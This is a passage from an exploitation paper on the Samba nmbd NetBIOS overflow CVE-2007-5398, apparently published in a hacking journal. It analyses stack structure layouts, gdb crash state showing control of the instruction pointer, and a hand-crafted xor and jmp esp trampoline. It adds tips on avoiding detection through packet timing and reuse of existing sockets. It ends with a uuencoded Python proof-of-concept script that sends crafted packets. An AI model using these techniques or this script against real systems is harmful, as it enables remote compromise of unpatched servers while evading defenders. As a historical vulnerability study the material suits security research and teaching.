+
+...
+
+441 /* A resource record. */
+442 struct res_rec {
+443         struct nmb_name rr_name;
+444         int rr_type;
+445         int rr_class;
+446         int ttl;
+447         int rdlength;
+448         char rdata[MAX_DGRAM_SIZE];
+449 };
+450 
+
+
+...
+
+include/smb.h:
+1718 /* A netbios name structure. */
+1719 struct nmb_name {
+1720         nstring      name;
+1721         char         scope[64];
+1722         unsigned int name_type;
+1723 };
+
+...
+
+1712 #define MAX_NETBIOSNAME_LEN 16
+1713 /* DOS character, NetBIOS namestring. Type used on the wire. */
+1714 typedef char nstring[MAX_NETBIOSNAME_LEN];
+1715 /* Unix character, NetBIOS namestring. Type used to manipulate name in 
+nmbd. */ 1716 typedef char unstring[MAX_NETBIOSNAME_LEN*4];
+--------------------------------------------
+
+Looking over the struct nmb_packet, we see that it may be useful to 
+overwrite the qdcount, and set a count for either ancount, nscount, or
+adcount (which map to the pointers: answers, nsrec and additional,
+respectively). Since there are 12 bytes, we can directly control one set of
+these. Hopefully, the control of the count arguments map to direct control 
+of the same pointer, otherwise additional problems will be had.
+
+Looking at these structure layouts, one way of setting this up would be to
+analyze the stack layouts, and re-create the structures in the exploit code
+,which then gets serialized / sent across the wire. 
+
+One disadvantage of this model is that it needs additional flexibility 
+due to difference in compiler output for different versions, and 
+potentially different compiler flags / options / optimisations, as there 
+may be additional padding / ordering, and other fun things to deal.
+
+An additional problem with controlling a pointer to a "struct res_rec" is 
+that that the rdlength field has to be a sane value, otherwise it may crash 
+in memcpy, or, cause an EIP overwrite in the sendpacket() function in char
+buf[1024];. Both of these results would cause the process to crash :(. As
+this is a single shot vulnerability, causing it to potentially crash is 
+out of the question.
+
+Since we're unable to know contents of the memory we're trying to leak in
+advance, there doesn't appear to be much point continuing down this path. 
+That said, it may be possible to use certain static[] data to leak contents 
+of the .bss and heap that may be useful. 
+
+After initially being disappointed about this realisation, I realised that 
+by using known static .bss location, we could hopefully leak the rest of 
+the .bss, then, if we're lucky, the heap allocation. One side effect of 
+trying to leak the heap layout, is that it is not guaranteed to be straight 
+after the nmbd .bss. (For example, default kernel on Fedora 8 ships with 
+heap randomised and NOT after the .bss).
+
+Due to this, we would need to find a suitable pointer to the heap in the
+.bss. A suitable pointer value is:
+
+ * One that is not allocated too early in the nmbd initialisation process.
+   This requirement is because the res_rec structure size is fairly large,
+   and if it is an early allocated structure, by adjusting the pointer so 
+   that
+   rdlength points to the integer, it may hit an unmapped page.
+ * One that has a suitable small 4 byte integer value from the pointer
+   location, so that we can continue the memory leaking / analysis.
+
+Before we get too far ahead of ourselves, first we need to re-create the 
+stack layout, and see if we can overwrite some of the counts / pointers 
+correctly.
+
+After doing some analysis of how the stack is laid out, (via IDA Pro 
+Standard 5.2) we can start to adjust the exploit code to ensure it works. 
+I added the applicable structure representations in python so that I could
+set the values explicitly (for example, nmb_packet['answers'] = 0x08049000)
+, rather than having to hard code offsets / hex arrays. 
+
+Unfortunately, it appears that the stack layout for FreeBSD 6.2's Samba
+release, the ancount variable is not aligned with the 6 byte writes :( :(
+
+We can however influence the 2 most significant bytes (with least 2 
+significant bytes being flags), but reviewing the
+put_res_rec(), it kills the dream further:
+
+--------------------------------------------
+ 398         for (i=0;i<count;i++) {
+ 399                 int l = put_nmb_name(buf,offset,&recs[i].rr_name);
+ 400                 offset += l;
+ 401                 ret += l;
+ 402                 RSSVAL(buf,offset,recs[i].rr_type);
+ 403                 RSSVAL(buf,offset+2,recs[i].rr_class);
+ 404                 RSIVAL(buf,offset+4,recs[i].ttl);
+ 405                 RSSVAL(buf,offset+8,recs[i].rdlength);
+ 406                 memcpy(buf+offset+10,recs[i].rdata,recs[i].rdlength);
+ 407                 offset += 10+recs[i].rdlength;
+ 408                 ret += 10+recs[i].rdlength;
+ 409         }
+--------------------------------------------
+
+Looping at a minimum of 65536 is out of the question, as the 1024 byte
+buffer in send_packet() will quickly be overflowed, and the memcpy()
+length parameter is unknown on subsequent calls.
+
+Reviewing the flags that's available to us:
+
+--------------------------------------------
+  77 /********************************************************************
+  78 Get/Set problematic nb_flags as network byte order 16 bit int.
+  79 ********************************************************************/
+  80 
+  81 uint16 get_nb_flags(char *buf)
+  82 {
+  83         return ((((uint16)*buf)&0xFFFF) & NB_FLGMSK);
+  84 }
+  85 
+  86 void set_nb_flags(char *buf, uint16 nb_flags)
+  87 {
+  88         *buf++ = ((nb_flags & NB_FLGMSK) & 0xFF);
+  89         *buf = '\0';
+  90 }
+
+  nameserv.h:
+  89 /* Mask applied to outgoing NetBIOS flags. */
+  90 #define NB_FLGMSK 0xE0
+
+--------------------------------------------
+
+We can see we control the most significant byte of the 2-byte flag, which 
+is still highly undesirable, as the put_res_rec() code will loop at a 
+minimum of thirty two times. 
+
+Unfortunately, these restrictions prevent us from
+setting the ancount to 1. Due to the 6 byte writes, the other fields nsrec
+and additional will not be overwritten correctly. So far, it appears that
+FreeBSD 6.2 default samba package is not vulnerable to this identified 
+memory leak, which is unfortunate.
+
+After a quick analysis of the nmbd binary in Ubuntu 7.10 default install, 
+it appears the stack checking code re-ordered the buffers, and put the 
+resource record after the packet structure - this means we can't use it to 
+leak memory from nmbd :( If we could of leaked memory, there may be a 
+possibility to use that to reveal what the stack cookie is. If the stack \
+cookie was leakable, and our 6 byte writes aligned correctly, we could 
+exploit the process.
+
+--[ 5.6.2 - Back to the future^W.bss
+
+I decided to look at the crash state again, and see what we can do with 
+the 15 byte static .bss value in name_to_key()
+
+--------------------------------------------
+Starting program: /usr/local/sbin/nmbd -F -D  -s smb.conf 
+Program received signal SIGSEGV, Segmentation fault.
+0x41414242 in ?? ()
+(gdb) i r
+eax            0x1      1
+ecx            0x2834fd80       674561408
+edx            0x40     64
+ebx            0x42420000       1111621632
+esp            0xbfbfe544       0xbfbfe544
+ebp            0x5a5a0000       0x5a5a0000
+esi            0x4242   16962
+edi            0x41414242       1094795842
+eip            0x41414242       0x41414242
+eflags         0x10282  66178
+cs             0x33     51
+ss             0x3b     59
+ds             0x3b     59
+es             0x3b     59
+fs             0x3b     59
+gs             0x1b     27
+(gdb) 
+--------------------------------------------
+
+After looking at it again, we have:
+
+ * partial control of ebx (two most significant bytes)
+ * partial control of ebp (two most significant bytes)
+ * partial control of esi (two least significant bytes)
+
+After thinking about this a little more, with a bit of experimentation, we
+could use "xor [edi+offset], reg" to modify partial contents of the code
+that we could execute.
+
+Testing this theory out, we see:
+
+--------------------------------------------
+$ ndisasm -b 32 t
+00000000  315F08            xor [edi+0x8],ebx
+00000003  317708            xor [edi+0x8],esi
+00000006  316F08            xor [edi+0x8],ebp
+00000009  314708            xor [edi+0x8],eax
+0000000C  315F08            xor [edi+0x8],ebx
+0000000F  314F08            xor [edi+0x8],ecx
+00000012  315708            xor [edi+0x8],edx
+00000015  317F08            xor [edi+0x8],edi
+
+simple toupper:
+
+$ cat t | tr a-z A-Z | ndisasm -b 32 - 
+00000000  315F08            xor [edi+0x8],ebx
+00000003  315708            xor [edi+0x8],edx
+00000006  314F08            xor [edi+0x8],ecx
+00000009  314708            xor [edi+0x8],eax
+0000000C  315F08            xor [edi+0x8],ebx
+0000000F  314F08            xor [edi+0x8],ecx
+00000012  315708            xor [edi+0x8],edx
+00000015  317F08            xor [edi+0x8],edi
+--------------------------------------------
+
+From the above, we can see that we can't use esi and ebp directly in the
+xor argument, so if needed, we can push/pop around it. (This is not ideal,
+as it reduces the space left that we may be critical.)
+
+Looking quickly at this, we can do:
+--------------------------------------------
+xor [edi + <offset>], ebx 
+push ebp
+pop ebx
+xor [edi + <offset>], ebx
+sub esp, esi
+jmp esp
+--------------------------------------------
+
+The last two instructions encode to \x29\xf4\xff\xe4, so that means we need
+a byte with high bit set, that preferably expands to three bytes. (If the
+previous sentence does not make sense, re-read the section on how the 
+netbios name is converted due to charset issues). Quickly generating the 
+applicable bytes, we see that \xb0 expands to \xe2\x96\x91, and is a 
+suitable byte to use.
+
+To get what we need:
+
+--------------------------------------------
+>>> hex(0xe2 ^ 0xf4) 
+'0x16'
+>>> hex(0x96 ^ 0xff)
+'0x69'
+>>> hex(0x91 ^ 0xe4)
+'0x75'
+--------------------------------------------
+
+Putting all this together, we get: 
+
+--------------------------------------------
+Breakpoint 1, 0x08117f80 in keydata.21 ()
+(gdb) x/10i $eip
+0x8117f80 <keydata.21>: xor    %ebx,0x7(%edi)
+0x8117f83 <keydata.21+3>:       push   %ebp
+0x8117f84 <keydata.21+4>:       pop    %ebx
+0x8117f85 <keydata.21+5>:       xor    %ebx,0x9(%edi)
+0x8117f88 <keydata.21+8>:       sub    %esp,%edx
+0x8117f8a <keydata.21+10>:      xchg   %eax,%esi
+0x8117f8b <keydata.21+11>:      xchg   %eax,%ecx
+0x8117f8c <keydata.21+12>:      dec    %ecx
+...
+(gdb) stepi
+0x08117f83 in keydata.21 ()
+(gdb) x/10i $eip
+0x8117f83 <keydata.21+3>:       push   %ebp
+0x8117f84 <keydata.21+4>:       pop    %ebx
+0x8117f85 <keydata.21+5>:       xor    %ebx,0x9(%edi)
+0x8117f88 <keydata.21+8>:       sub    %esi,%esp
+0x8117f8a <keydata.21+10>:      call   *0x504e5749(%ecx)
+0x8117f90 <keydata.21+16>:      add    %al,(%eax)
+...
+(gdb) stepi
+0x08117f84 in keydata.21 ()
+(gdb) 
+0x08117f85 in keydata.21 ()
+(gdb) 
+0x08117f88 in keydata.21 ()
+(gdb) x/10i $eip
+0x8117f88 <keydata.21+8>:       sub    %esi,%esp
+0x8117f8a <keydata.21+10>:      jmp    *%esp
+...
+(gdb) i r esi
+esi            0x59e    1438
+(gdb) x/10i $esp - $esi 
+0xbfbfdfa6:     cld    
+0xbfbfdfa7:     mov    %edi,%eax
+0xbfbfdfa9:     addb   $0x0,(%eax)
+0xbfbfdfac:     mov    %edi,%esi
+0xbfbfdfae:     nop    
+0xbfbfdfaf:     addb   $0x0,(%eax)
+0xbfbfdfb2:     add    $0x3c,%esi
+0xbfbfdfb5:     addb   $0x0,(%eax)
+0xbfbfdfb8:     mov    %esp,%edi
+0xbfbfdfba:     nop    
+--------------------------------------------
+
+One problem with the above, is that the first_layer_sc.asm needs to be
+updated, as various things have changed. Such as edi pointing to the .bss
+memory location, esp pointing to where we are currently executing, etc.
+Those changes are relatively minor however.
+
+Unfortunately, due to the half eip overwrite, we still need two addresses
+to gain code execution. However, this mechanism is probably more reliable 
+than relying on stack addresses to be the same each run.
+
+--[ 5.7 - Additional exploitation notes
+
+Registrations take a parameter called ttl (time to live).. looking at the
+Samba source we see:
+
+--------------------------------------------
+static int get_ttl_from_packet(struct nmb_packet *nmb)
+{
+        int ttl = nmb->additional->ttl;
+
+        if (ttl < lp_min_wins_ttl()) {
+                ttl = lp_min_wins_ttl();
+        }
+
+        if (ttl > lp_max_wins_ttl()) {
+                ttl = lp_max_wins_ttl();
+        }
+
+        return ttl;
+}
+
+param/loadparam.c:
+FN_GLOBAL_INTEGER(lp_min_wins_ttl, &Globals.min_wins_ttl)
+Globals.min_wins_ttl = 60 * 60 * 6;     /* 6 hours default. */
+Globals.max_wins_ttl = 60 * 60 * 24 * 6;        /* 6 days default. */
+--------------------------------------------
+
+This means that by default, we have just under 6 hours to send all the
+required packets, and if we wanted, just under 6 days to exploit it. If the
+registration packets are sent at appropriate intervals, this should avoid 
+any signatures based on sending interval / query times. Another way to 
+avoid simple detection, would be to use differing netbios registration 
+flags, and avoid reasonably static ip addresses.
+
+In addition to the above time out, with a little bit more effort, it's
+possible to use the existing file descriptor, and ip address / port
+information in the packet structure passed to reply_netbios_packet(), in
+order to avoid new network connections which may be noticed / firewall'd /
+blocked in some way.
+
+With further work against known targets, the ebp register could be restored
+correctly, and execution flow could be restored to the appropriate point.
+This would provide seamless exploitation. 
+
+--[ 6 - References
+
+[1] http://us1.samba.org/samba/security/CVE-2007-5398.html
+    http://secunia.com/secunia_research/2007-90/advisory/
+[2] http://www.wireshark.org
+[3] http://oss.coresecurity.com/projects/impacket.html
+[4] http://sourceforge.net/projects/tdb/
+[5] http://www.cs.rice.edu/~scrosby/hash/
+[6] http://oss.coresecurity.com/projects/inlineegg.html
+[7] http://www.phrack.org/issues.html?issue=59&id=7
+[8] Bounds error: attempt to reference memory overrunning the end of an
+    object. Pointer value: References, size: 1 
+
+--[ 7 - Addendum 
+
+I'm honoured that this paper was even considered worthy for inclusion. 
+Thanks for the support ;)
+
+I'll be present at Ruxcon 2008, so come along and join in the fun. 
+http://www.ruxcon.org.au/ - 29th November, 2008
+
+Here is a proof of concept to trigger the issue:
+
+begin 600 CVE-2007_5398-trigger.py
+M(R$O=7-R+V)I;B]P>71H;VX@#0H-"FEM<&]R="!S=')U8W0-"FEM<&]R="!I
+M;7!A8VME="YS=')U8W1U<F4-"FEM<&]R="!I;7!A8VME="YN;6(@#0II;7!O
+M<G0@<F%N9&]M#0II;7!O<G0@<WES#0II;7!O<G0@<V]C:V5T#0II;7!O<G0@
+M=&EM90T*#0IC;&%S<R!.34)?4F5G:7-T97)?4&%C:V5T*&EM<&%C:V5T+G-T
+M<G5C='5R92Y3=')U8W1U<F4I.@T*"7-T<G5C='5R92`]("@-"@D)*"`G=')A
+M;G-A8W1I;VY?:60G+"`G(4@G("DL#0H)"2@@)V9L86=S)RP@)R%()RDL#0H)
+M"2@@)W%U97-T:6]N<R<L("<A2"<@*2P-"@D)*"`G86YS=V5R7W)R<R<L("<A
+M2"<@*2P-"@D)*"`G875T:&]R:71Y7W)R<R<L("<A2"<@*2P-"@D)*"`G861D
+M:71I;VYA;%]R<G,G+"`G(4@G*2P-"@T*"0DH("=Q=65R>5]N86UE)RP@)S,T
+M<R<I+`T*"0DH("=Q=65R>5]T>7!E)RP@)R%()R`I+`T*"0DH("=Q=65R>5]C
+M;&%S<R<L("<A2"<@*2P-"@D)#0H)"2@@)V%D9&ET:6]N86Q?;F%M92<L("<R
+M<R<@*2P-"@D)*"`G861D:71I;VYA;%]T>7!E)RP@)R%()RDL#0H)"2@@)V%D
+M9&ET:6]N86Q?8VQA<W,G+"`G(4@G("DL#0H)"2@@)W1I;65?=&]?;&EV92<L
+M("<A3"<@*2P-"@D)*"`G9&%T85]L96XG+"`G(4@G("DL#0H)"2@@)V%D9&ET
+M:6]N86Q?9FQA9W,G+"`G(4@G("DL#0H)"2@@)V%D9&ET:6]N86Q?:7!A9&1R
+M)RP@)R%,)R`I#0H)*0T*#0IC;&%S<R!.34)?5')I9V=E<E]086-K970H:6UP
+M86-K970N<W1R=6-T=7)E+E-T<G5C='5R92DZ#0H)<W1R=6-T=7)E(#T@*`T*
+M"0DH("=T<F%N<V%C=&EO;E]I9"<L("<A2"<@*2P-"@D)*"`G9FQA9W,G+"`G
+M(4@G*2P-"@D)*"`G<75E<W1I;VYS)RP@)R%()R`I+`T*"0DH("=A;G-W97)?
+M<G)S)RP@)R%()R`I+`T*"0DH("=A=71H;W)I='E?<G)S)RP@)R%()R`I+`T*
+M"0DH("=A9&1I=&EO;F%L7W)R<R<L("<A2"<I+`T*#0H)"2@@)W%U97)Y7VYA
+M;64G+"`G,S1S)RDL#0H)"2@@)W%U97)Y7W1Y<&4G+"`G(4@G("DL#0H)"2@@
+M)W%U97)Y7V-L87-S)RP@)R%()R`I+`T*"2D-"@T*8VQA<W,@0U9%7S(P,#=?
+M-3,Y.#H-"@T*"71A<F=E=',@/2!;#0H)"7L@#0H)"0DG;F%M92<Z("=$96)U
+M9V=I;F<G+`T*"0D))V1E<V-R:7!T:6]N)SH@)U1H:7,@=&%R9V5T(&%I;7,@
+M=&\@8W)A<V@@=&AE('9U;&YE<F%B;&4@<V5R=FEC92<L#0H)"0DG<F5G:7-T
+M97)?<&%C:V5T<R<Z(#$P,`T*"0E]#0H)70T*"0D-"@T*"61E9B!?7VEN:71?
+M7RAS96QF+"!H;W-T+"!T87)G970I.@T*"0EI9BAT87)G970@/"`P(&]R('1A
+M<F=E="`^(&QE;BAS96QF+G1A<F=E=',I*3H-"@D)"7)A:7-E($5X8V5P=&EO
+M;BP@)TEN=F%L:60@=&%R9V5T(&ED('-P96-I9FEE9"X@4&QE87-E('-E92`M
+M:"!F;W(@;6]R92!I;F9O<FUA=&EO;B<-"@T*"0ES96QF+FAO<W0@/2!H;W-T
+M#0H)"7-E;&8N=&%R9V5T7VED(#T@=&%R9V5T#0H-"@ED968@0W)E871E3DU"
+M4F5G:7-T97)086-K970H<V5L9BP@;F%M92P@:7`L(&9L86=S*3H-"@D)96YC
+M;V1E9%]N86UE(#T@:6UP86-K970N;FUB+F5N8V]D95]N86UE*&YA;64L(#!X
+M,6(L("(B*0T*#0H)"7!A8VME="`]($Y-0E]296=I<W1E<E]086-K970H*0T*
+M"0EP86-K971;)W1R86YS86-T:6]N7VED)UT@/2!R86YD;VTN<F%N9&EN="@P
+M+"`P>&9F9F8I#0H)"7!A8VME=%LG9FQA9W,G72`](#!X,CDP,`T*"0EP86-K
+M971;)W%U97-T:6]N<R==(#T@,0T*"0EP86-K971;)V%N<W=E<E]R<G,G72`]
+M(#`-"@D)<&%C:V5T6R=A=71H;W)I='E?<G)S)UT@/2`P#0H)"7!A8VME=%LG
+M861D:71I;VYA;%]R<G,G72`](#$-"@T*"0EP86-K971;)W%U97)Y7VYA;64G
+M72`](&5N8V]D961?;F%M90T*"0EP86-K971;)W%U97)Y7W1Y<&4G72`](#!X
+M,C`-"@D)<&%C:V5T6R=Q=65R>5]C;&%S<R==(#T@,'@P,0T*"0D-"@D)<&%C
+M:V5T6R=A9&1I=&EO;F%L7VYA;64G72`](")<>&,P7'@P8R(-"@D)<&%C:V5T
+M6R=A9&1I=&EO;F%L7W1Y<&4G72`](#!X,#`R,`T*"0EP86-K971;)V%D9&ET
+M:6]N86Q?8VQA<W,G72`](#!X,#`P,0T*"0EP86-K971;)W1I;65?=&]?;&EV
+M92==(#T@,`T*"0EP86-K971;)V1A=&%?;&5N)UT@/2`V#0H)"7!A8VME=%LG
+M861D:71I;VYA;%]F;&%G<R==(#T@9FQA9W,-"@D)<&%C:V5T6R=A9&1I=&EO
+M;F%L7VEP861D<B==(#T@:7`-"@D-"@D)<F5T=7)N('-T<BAP86-K970I#0H-
+M"@ED968@5')I9V=E<E9U;&YE<F%B:6QI='DH<V5L9BDZ#0H)"6YA;64@/2!I
+M;7!A8VME="YN;6(N96YC;V1E7VYA;64H)RHG+"`P>#%B+"`B(BD-"@T*"0DC
+M($ET(&%P<&5A<G,@:6UP86-K970N;FUB+F5N8V]D95]N86UE(&1O97,@;F]T
+M(&AA;F1L92!T:&4@86)O=F4@8V%S92!E=F5R>2!W96QL("T@<V\@=V4@96YC
+M;V1E#0H)"2,@=&AE('1Y<&4@;6%N=6%L;'D-"@T*"0EN86UE(#T@;F%M95LZ
+M,S%=("L@(EQX-#)<>#1C(B`K(&YA;65;,S,Z70T*#0H)"71R:6=G97(@/2!.
+M34)?5')I9V=E<E]086-K970H*0T*"0ET<FEG9V5R6R=T<F%N<V%C=&EO;E]I
+M9"==(#T@<F%N9&]M+G)A;F1I;G0H,"P@,'AF9F9F*0T*"0ET<FEG9V5R6R=F
+M;&%G<R==(#T@,'@P,3`P#0H)"71R:6=G97);)W%U97-T:6]N<R==(#T@,0T*
+M"0ET<FEG9V5R6R=A;G-W97)?<G)S)UT@/2`P#0H)"71R:6=G97);)V%U=&AO
+M<FET>5]R<G,G72`](#`-"@D)=')I9V=E<ELG861D:71I;VYA;%]R<G,G72`]
+M(#`-"@T*"0ET<FEG9V5R6R=Q=65R>5]N86UE)UT@/2!N86UE#0H)"71R:6=G
+M97);)W%U97)Y7W1Y<&4G72`](#!X,C`)#0H)"71R:6=G97);)W%U97)Y7V-L
+M87-S)UT@/2`P>#`Q#0H-"@D)<VMT(#T@<V5L9BY#;VYN96-T*"D-"@D)<VMT
+M+G-E;F0H<W1R*'1R:6=G97(I*0T*"0ES:W0N8VQO<V4H*0T*#0H)9&5F($UA
+M:V5.86UE*'-E;&8I.@T*"0EL971T97)S(#T@6VD@9F]R(&D@:6X@<F%N9V4H
+M;W)D*"=!)RDL(&]R9"@G6B<I*S$I70T*"0ER86YD;VTN<VAU9F9L92AL971T
+M97)S*0T*"0EN86UE(#T@<F%N9&]M+G-A;7!L92AL971T97)S+"!R86YD;VTN
+M<F%N9&EN="@R+"`Q-"DI#0H)"6YA;64@/2`G)RYJ;VEN*%MC:'(H:2D@9F]R
+M(&D@:6X@;F%M95TI#0H-"@D)<F5T=7)N(&YA;64-"@T*"61E9B!#<F5A=&50
+M86-K971S*'-E;&8I.@T*"0EP86-K971S(#T@6UT-"@D)#0H)"69O<B!I(&EN
+M(')A;F=E*'-E;&8N=&%R9V5T<UMS96QF+G1A<F=E=%]I9%U;)W)E9VES=&5R
+M7W!A8VME=',G72DZ#0H)"0DC(&EP(#T@<F%N9&]M+G)A;F1I;G0H,"P@,'AF
+M9F9F9F9F9BD-"@D)"6EP(#T@,'@V.#8Y-F$V8@T*"0D);F%M92`]('-E;&8N
+M36%K94YA;64H*0T*"0D)<&%C:V5T(#T@<V5L9BY#<F5A=&5.34)296=I<W1E
+M<E!A8VME="AN86UE+"!I<"P@,'@V,#`P*0T*"0D)<&%C:V5T<RYA<'!E;F0H
+M<&%C:V5T*0T*#0H)"7)E='5R;B!P86-K971S#0H-"@ED968@0V]N;F5C="AS
+M96QF*3H-"@D)<VMT(#T@<V]C:V5T+G-O8VME="AS;V-K970N049?24Y%5"P@
+M<V]C:V5T+E-/0TM?1$=204TL(#`I#0H)"7-K="YC;VYN96-T*"AS96QF+FAO
+M<W0L(#$S-RDI#0H)"7)E='5R;B!S:W0-"@T*"61E9B!396YD4&%C:V5T<RAS
+M96QF+"!P86-K971S*3H-"@D)<VMT(#T@<V5L9BY#;VYN96-T*"D-"@D)9F]R
+M('!A8VME="!I;B!P86-K971S.@T*"0D)<VMT+G-E;F0H<&%C:V5T*0T*"0D)
+M=&EM92YS;&5E<"@P+C$I#0H-"@D)<VMT+F-L;W-E*"D-"@T*#0H)9&5F(')U
+M;BAS96QF*3H-"@D)<&%C:V5T<R`]('-E;&8N0W)E871E4&%C:V5T<R@I#0H)
+M"7-E;&8N4V5N9%!A8VME=',H<&%C:V5T<RD-"@T*"0ES96QF+E1R:6=G97)6
+M=6QN97)A8FEL:71Y*"D-"@D-"F1E9B!P87)S95]A<F=S*&%R9W,I.@T*"69R
+M;VT@;W!T<&%R<V4@:6UP;W)T($]P=&EO;E!A<G-E<@T*#0H)<&%R<V5R(#T@
+M3W!T:6]N4&%R<V5R*"D-"@EP87)S97(N<V5T7V1E9F%U;'1S*&AO<W0]3F]N
+M92P@=&%R9V5T/4YO;F4L(&QI<W0]1F%L<V4I#0H-"@EP87)S97(N861D7V]P
+M=&EO;B@G+2UH;W-T)RP@9&5S=#TB:&]S="(I#0H)<&%R<V5R+F%D9%]O<'1I
+M;VXH)RTM=&%R9V5T)RP@9&5S=#TB=&%R9V5T(BP@='EP93TB:6YT(BD-"@EP
+M87)S97(N861D7V]P=&EO;B@G+2UL:7-T)RP@9&5S=#TB;&ES="(L(&%C=&EO
+M;CTB<W1O<F5?=')U92(I#0H-"@EO<'1S+"!A<F=S(#T@<&%R<V5R+G!A<G-E
+M7V%R9W,H87)G<RD-"@T*"6EF*&]P=',N:&]S="!I<R!.;VYE*3H-"@D)<F%I
+M<V4@17AC97!T:6]N+"`G2&]S="!A<F=U;65N="!H87,@;F]T(&)E96X@<W5P
+M<&QI960L('!L96%S92!R=6X@=VET:"`M:"!T;R!S964@<&%R86UE=&5R<R<-
+M"@T*"6EF*&]P=',N=&%R9V5T(&ES($YO;F4I.@T*"0ER86ES92!%>&-E<'1I
+M;VXL("=487)G970@87)G=6UE;G0@:&%S(&YO="!B965N('-U<'!L:65D+"!P
+M;&5A<V4@<G5N('=I=&@@+6@@=&\@<V5E('!A<F%M971E<G,G#0H-"@EI9BAO
+M<'1S+FQI<W0I.@T*"0EF;W(@=&%R9V5T(&EN($-615\R,#`W7S4S.3@N=&%R
+M9V5T<SH-"@D)"7!R:6YT("(E,3)S("`@("5S(B`E("AT87)G971;)VYA;64G
+M72P@=&%R9V5T6R=D97-C<FEP=&EO;B==*0T*#0H)"7-Y<RYE>&ET*#$I#0H-
+M"@ER971U<FX@;W!T<RP@87)G<PT*#0ID968@;6%I;BAA<F=S*3H-"@EO<'1S
+M+"!A<F=S(#T@<&%R<V5?87)G<RAA<F=S*0T*#0H)97AP;&]I="`]($-615\R
+M,#`W7S4S.3@H;W!T<RYH;W-T+"!O<'1S+G1A<F=E="D-"@EE>'!L;VET+G)U
+M;B@I#0H-"FEF(%]?;F%M95]?(#T]("=?7VUA:6Y?7R<Z#0H);6%I;BAS>7,N
+-87)G=ELQ.ETI#0H-"F%M
+`
+end
